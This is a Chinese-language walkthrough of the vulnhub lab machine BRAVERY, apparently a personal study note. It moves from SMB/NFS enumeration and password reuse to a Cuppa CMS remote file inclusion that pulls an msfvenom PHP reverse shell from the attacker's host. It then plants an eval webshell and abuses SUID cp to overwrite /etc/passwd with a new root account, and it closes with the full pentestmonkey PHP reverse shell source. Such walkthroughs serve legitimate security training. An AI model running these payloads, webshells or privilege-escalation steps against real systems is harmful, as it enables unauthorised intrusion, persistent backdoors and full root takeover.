---
title: 'vulhub    DIGITALWORLD.LOCAL: BRAVERY'
updated: 2023-06-26 02:01:40Z
created: 2022-10-22 02:54:08Z
---

**探测靶机ip及端口开放情况**

```sh
Nmap scan report for 192.168.56.15
Host is up (0.00020s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 08:00:27:B6:AC:46 (Oracle VirtualBox virtual NIC)
```

访问8080,扫描目录如下

```sh
└─# python dirsearch.py -u http://192.168.56.15:8080/

  _|. _ _  _  _  _ _|_    v0.4.2.6
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342

Output File: /root/dirsearch/reports/192.168.56.15_8080/__22-10-26_15-42-50.txt

Target: http://192.168.56.15:8080/

[15:42:50] Starting: 
[15:42:56] 200 -    4KB - /404.html                                         
[15:42:57] 200 -  503B  - /about                                            
[15:43:18] 200 -    3KB - /index.html                                       
[15:43:30] 301 -  185B  - /private  ->  http://192.168.56.15:8080/private/  
[15:43:31] 301 -  185B  - /public  ->  http://192.168.56.15:8080/public/    
[15:43:31] 200 -   22KB - /public/                                          
[15:43:32] 200 -  103B  - /robots.txt
```

```sh
└─# python dirsearch.py -u http://192.168.56.15:8080/public

  _|. _ _  _  _  _ _|_    v0.4.2.6
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342

Output File: /root/dirsearch/reports/192.168.56.15_8080/_public_22-10-26_15-44-17.txt

Target: http://192.168.56.15:8080/public/

[15:44:17] Starting: 
[15:44:18] 301 -  185B  - /public/js  ->  http://192.168.56.15:8080/public/js/
[15:44:19] 200 -   14KB - /public/.DS_Store                                 
[15:44:38] 301 -  185B  - /public/css  ->  http://192.168.56.15:8080/public/css/
[15:44:42] 301 -  185B  - /public/fonts  ->  http://192.168.56.15:8080/public/fonts/
[15:44:45] 301 -  185B  - /public/img  ->  http://192.168.56.15:8080/public/img/
[15:44:45] 200 -   22KB - /public/index.html                                
[15:44:47] 403 -  571B  - /public/js/                                       
[15:44:50] 200 -  766B  - /public/mail.php
```

访问各个web目录,如下

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9287f5ad2764d3e4972692cb1ec023de.png" alt="9287f5ad2764d3e4972692cb1ec023de.png" width="885" height="528" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/53e64311e9988394fe99f638c42aef1c.png" alt="53e64311e9988394fe99f638c42aef1c.png" width="867" height="395" class="jop-noMdConv"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/bb7d7fb95ebc0adc10689b4abed38a25.png" alt="bb7d7fb95ebc0adc10689b4abed38a25.png" width="797" height="439" class="jop-noMdConv">

没有发现有价值的信息

* * *

发现开放了445端口，尝试访问得到如下

发现anonymous 可以访问，secured无法访问

```sh
└─# smbmap  -H 192.168.56.15
[+] Guest session       IP: 192.168.56.15:445   Name: 192.168.56.15                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        anonymous                                               READ ONLY
        secured                                                 NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.7.1)
```

继续访问anonymous 文件夹下数据，得到

```sh
└─# smbclient //192.168.56.15/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep 28 21:01:35 2018
  ..                                  D        0  Fri Jun 15 00:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 20:38:27 2018
  qiu's folder                        D        0  Fri Sep 28 21:27:20 2018
  genevieve's folder                  D        0  Fri Sep 28 21:08:31 2018
  david's folder                      D        0  Wed Dec 26 10:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 20:52:49 2018
  qinyi's folder                      D        0  Fri Sep 28 20:45:22 2018
  sara's folder                       D        0  Fri Sep 28 21:34:23 2018
  readme.txt                          N      489  Fri Sep 28 21:54:03 2018

                17811456 blocks of size 1024. 13171116 blocks available
smb: \>
```

查看该目录下的内容，木有什么有价值的

* * *

还发现了nfs服务，查看发现存在nfs目录，将其挂载到本地

```sh
┌──(root㉿kali)-[~/dirsearch]
└─# showmount -e 192.168.56.15                            
Export list for 192.168.56.15:
/var/nfsshare *
                                                                                                                           
┌──(root㉿kali)-[~/dirsearch]
└─# mount -t nfs 192.168.56.15:/var/nfsshare  /mnt/bravery
                                                                                                                           
┌──(root㉿kali)-[~/dirsearch]
└─# cd /mnt/bravery 
                                                                                                                           
┌──(root㉿kali)-[/mnt/bravery]
└─# ls
discovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt
```

查看nfs目录下的文件

```sh
┌──(root㉿kali)-[/mnt/bravery]
└─# ls              
discovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt
                                                                                                                           
┌──(root㉿kali)-[/mnt/bravery]
└─# cat password.txt
Passwords should not be stored in clear-text, written in post-its or written on files on the hard disk!
                                                                                                                           
┌──(root㉿kali)-[/mnt/bravery]
└─# cat README.txt  
read me first!
```

`qwertyuioplkjhgfdsazxcvbnm`应当是一个密码

想到之前samba共享的secured目录需要登录，尝试使用刚获取的密码

账户猜测是anonymous 文件夹下的 xxx’s folder的名字，成功登录secured目录

```sh
└─# smbclient -U david //192.168.56.15/secured
Password for [WORKGROUP\david]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep 28 21:52:14 2018
  ..                                  D        0  Fri Jun 15 00:30:39 2018
  david.txt                           N      376  Sat Jun 16 16:36:07 2018
  genevieve.txt                       N      398  Tue Jul 24 00:51:27 2018
  README.txt                          N      323  Tue Jul 24 09:58:53 2018

                17811456 blocks of size 1024. 13181944 blocks available
smb: \> get david.txt
getting file \david.txt of size 376 as david.txt (8.0 KiloBytes/sec) (average 8.0 KiloBytes/sec)
smb: \> get genevieve.txt 
getting file \genevieve.txt of size 398 as genevieve.txt (9.0 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> get README.txt 
getting file \README.txt of size 323 as README.txt (21.0 KiloBytes/sec) (average 10.3 KiloBytes/sec)
```

查看三个文件的信息

```sh
└─# cat david.txt 
I have concerns over how the developers are designing their webpage. The use of "developmentsecretpage" is too long and unwieldy. We should cut short the addresses in our local domain.

1. Reminder to tell Patrick to replace "developmentsecretpage" with "devops".

2. Request the intern to adjust her Favourites to http://<developmentIPandport>/devops/directortestpagev1.php.
                                                                                                                           
┌──(root㉿kali)-[~]
└─# cat genevieve.txt 
Hi! This is Genevieve!

We are still trying to construct our department's IT infrastructure; it's been proving painful so far.

If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:

a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
                                                                                                                           
┌──(root㉿kali)-[~]
└─# cat README.txt 
README FOR THE USE OF THE BRAVERY MACHINE:

Your use of the BRAVERY machine is subject to the following conditions:

1. You are a permanent staff in Good Tech Inc.
2. Your rank is HEAD and above.
3. You have obtained your BRAVERY badges.

For more enquiries, please log into the CMS using the correct magic word: goodtech.
```

访问http://192.168.56.15/devops/directortestpagev1.php

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/54a44f54c9ff21fd31d3746ac89840cb.png" alt="54a44f54c9ff21fd31d3746ac89840cb.png" width="992" height="212" class="jop-noMdConv">

访问http://192.168.254.155/genevieve --\>  http://192.168.56.15/genevieve

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/6850429da6ab493a6643ded72e2e568a.png" alt="6850429da6ab493a6643ded72e2e568a.png" width="971" height="655" class="jop-noMdConv">

继续访问该站点，发现该站点为cuppaCMS

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9d345ebc9c20af949ef665a458c90767.png" alt="9d345ebc9c20af949ef665a458c90767.png" width="934" height="439" class="jop-noMdConv">

* * *

搜索cuppaCMS相关的漏洞

```sh
└─# searchsploit cuppa   
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusio | php/webapps/25971.txt
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

查看漏洞详情并尝试利用

```sh
└─# searchsploit -p 25971.txt
  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/25971
     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
File Type: C++ source, ASCII text, with very long lines (876)
```

```sh
└─# cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
```

该exp有两个漏洞点，一个本地文件包含读文件，一个远程文件包含

那我们开启kali http服务，并制作一个反弹shell木马，让靶机对其进行包含

msfvenom生成一个php木马

```sh
msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.56.123 lport=4444 -f raw > shell.php
```

接下来开启4444端口监听并对该php木马进行文件包含并开启

`http://192.168.56.15/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.123/shell.php`

成功获取到shell

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/86335f5a32486fdcb09cb011adeb5253.png" alt="86335f5a32486fdcb09cb011adeb5253.png" width="933" height="510" class="jop-noMdConv">

接下来尝试提权，该主机为linux，那么尝试进习惯SUID提权

`find / -perm -u=s -type f 2>/dev/null`

```sh
find / -perm -u=s -type f 2>/dev/null
/usr/bin/cp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/Xorg
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/ksu
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/flatpak-bwrap
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
/usr/libexec/qemu-bridge-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
sh-4.2$
```

发现cp命令可以root身份免密码使用

考虑自己制作一个root用户并添加至/etc/passwd文件中

先读取/etc/passwd文件

```sh
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
david:x:1000:1000:david:/home/david:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
geoclue:x:997:995:User for geoclue:/var/lib/geoclue:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:995:991:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
gluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin
unbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
colord:x:992:988:User for colord:/var/lib/colord:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
setroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
ossec:x:1001:1002::/var/ossec:/sbin/nologin
ossecm:x:1002:1002::/var/ossec:/sbin/nologin
ossecr:x:1003:1002::/var/ossec:/sbin/nologin
rick:x:1004:1004::/home/rick:/bin/bash
```

我们在/var/www/html目录下做一个一句话木马然后使用蚁剑连接

```sh
sh-4.2$ pwd        
/var/www/html
pwd
sh-4.2$ echo '<?php @eval($_POST[cmd]);?>' > ./hack.php
echo '<?php @eval($_POST[cmd]);?>' > ./hack.php
sh-4.2$ cat hack.php
cat hack.php
<?php @eval($_POST[cmd]);?>
```

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/610f6f7b3b2ed6e0fbb95a07bb789f29.png" alt="610f6f7b3b2ed6e0fbb95a07bb789f29.png" width="1062" height="281" class="jop-noMdConv">

制作一个passwd文件，其中内容为靶机的passwd文件，并将做好的root身份用户添加至passwd文件末尾，上传至靶机然后cp替代靶机的/etc/passwd文件

制作的用户为`sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash`

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8c894480caeb99dac32a2f501f433ad5.png" alt="8c894480caeb99dac32a2f501f433ad5.png" width="972" height="349" class="jop-noMdConv">

最后成功提权

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/23a904f907c03a6807414c6d5d2c4455.png" alt="23a904f907c03a6807414c6d5d2c4455.png" width="962" height="768" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8b4e596af7da646be8fb1456be2c657e.png" alt="8b4e596af7da646be8fb1456be2c657e.png" width="840" height="584" class="jop-noMdConv">

* * *

PS:这里贴一下用到的php反弹shell

```php
<?php

// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.123';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

?>
```